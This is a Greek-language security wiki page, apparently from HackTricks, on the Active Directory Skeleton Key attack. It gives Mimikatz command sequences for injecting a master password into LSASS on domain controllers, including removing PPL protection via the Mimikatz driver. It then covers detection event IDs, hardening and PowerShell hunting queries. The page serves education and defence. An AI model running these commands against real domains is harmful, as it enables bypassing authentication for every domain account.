# Skeleton Key

{{#include ../../banners/hacktricks-training.md}}

## Skeleton Key Attack

Το **Skeleton Key attack** είναι μια τεχνική που επιτρέπει στους attackers να **παρακάμπτουν το Active Directory authentication** πραγματοποιώντας **injecting ενός master password** στη διεργασία LSASS κάθε domain controller. Μετά το injection, το master password (προεπιλεγμένα **`mimikatz`**) μπορεί να χρησιμοποιηθεί για authentication ως **οποιοσδήποτε domain user**, ενώ τα πραγματικά τους passwords εξακολουθούν να λειτουργούν.<sup>[[1]](#references)[[2]](#references)</sup>

Βασικά στοιχεία:

- Απαιτεί **Domain Admin/SYSTEM + SeDebugPrivilege** σε κάθε DC και πρέπει να **εφαρμόζεται ξανά μετά από κάθε reboot**.<sup>[[2]](#references)</sup>
- Η κλασική υλοποίηση του Mimikatz κάνει patch στα validation paths των **NTLM** και **Kerberos RC4 (etype 0x17)**· το AES-only authentication **δεν αποδέχεται αυτό το skeleton password μέσω του RC4 hook**.<sup>[[2]](#references)</sup>
- Μπορεί να προκαλέσει conflict με third‑party LSA authentication packages ή πρόσθετους smart-card / MFA providers.<sup>[[2]](#references)</sup>
- Το Mimikatz module δέχεται το προαιρετικό switch `/letaes`, ώστε να μην τροποποιεί τα Kerberos/AES hooks σε περίπτωση προβλημάτων συμβατότητας.<sup>[[3]](#references)</sup>

### Εκτέλεση

Κλασικό LSASS χωρίς προστασία PPL:
```text
mimikatz # privilege::debug
mimikatz # misc::skeleton
```
Αν το **LSASS εκτελείται ως protected process light (PPL)**, η πρόσβαση για debug από το user-mode αποκλείεται. Η ιστορική διαδικασία του Mimikatz παρακάτω φορτώνει τον kernel driver του και αφαιρεί την προστασία πριν από το patching του LSASS. Το Credential Guard είναι ξεχωριστό isolation control και δεν πρέπει να χρησιμοποιείται ως συνώνυμο του PPL.<sup>[[3]](#references)[[4]](#references)</sup>
```text
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove   # drop PPL
mimikatz # misc::skeleton                               # inject master password 'mimikatz'
```
Μετά το injection, πραγματοποιήστε authenticate με οποιονδήποτε domain account, αλλά χρησιμοποιήστε τον κωδικό `mimikatz` (ή την τιμή που έχει οριστεί από τον operator). Θυμηθείτε να το επαναλάβετε σε **όλους τους DCs** σε περιβάλλοντα με πολλαπλούς DCs.

## Mitigations

- **Παρακολούθηση logs**
- System **Event ID 7045** (εγκατάσταση service/driver) για unsigned drivers όπως το `mimidrv.sys`.
- **Sysmon**: Event ID 7 (φόρτωση driver) για το `mimidrv.sys`; Event ID 10 για ύποπτη πρόσβαση στο `lsass.exe` από non-system processes.
- Security **Event ID 4673/4611** για χρήση ευαίσθητων privileges ή anomalies κατά την εγγραφή LSA authentication packages· συσχετίστε τα με μη αναμενόμενα 4624 logons που χρησιμοποιούν RC4 (etype 0x17) από DCs.
- **Hardening του LSASS**
- Διατηρήστε ενεργοποιημένα τα **RunAsPPL** και **Credential Guard** όπου υποστηρίζονται. Παρέχουν διαφορετικές protections και, σε συνδυασμό, αυξάνουν το κόστος και τα telemetry signals των προσπαθειών τροποποίησης ή εξαγωγής secrets από το LSASS.<sup>[[4]](#references)</sup>
- Απενεργοποιήστε το legacy **RC4** όπου είναι δυνατό· τα Kerberos tickets που περιορίζονται σε AES αποτρέπουν το RC4 hook path που χρησιμοποιεί το skeleton key.<sup>[[2]](#references)</sup>
- Γρήγορα PowerShell hunts:
- Εντοπισμός unsigned kernel driver installs: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*"}`
- Hunt για τον Mimikatz driver: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*" -and $_.message -like "*mimidrv*"}`
- Επαλήθευση ότι το PPL επιβάλλεται μετά το reboot: `Get-WinEvent -FilterHashtable @{Logname='System';ID=12} | ?{$_.message -like "*protected process*"}`

Για πρόσθετες οδηγίες σχετικά με το credential hardening, ελέγξτε το [Windows credentials protections](../stealing-credentials/credentials-protections.md).

## References

- [1] [Netwrix – Επίθεση Skeleton Key στο Active Directory (2022)](https://blog.netwrix.com/2022/11/29/skeleton-key-attack-active-directory/)
- [2] [TheHacker.recipes – Skeleton key (2026)](https://www.thehacker.recipes/ad/persistence/skeleton-key/)
- [3] [TheHacker.Tools – Mimikatz misc::skeleton module](https://tools.thehacker.recipes/mimikatz/modules/misc/skeleton)
- [4] [Microsoft Learn — Διαμόρφωση πρόσθετης προστασίας LSA](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
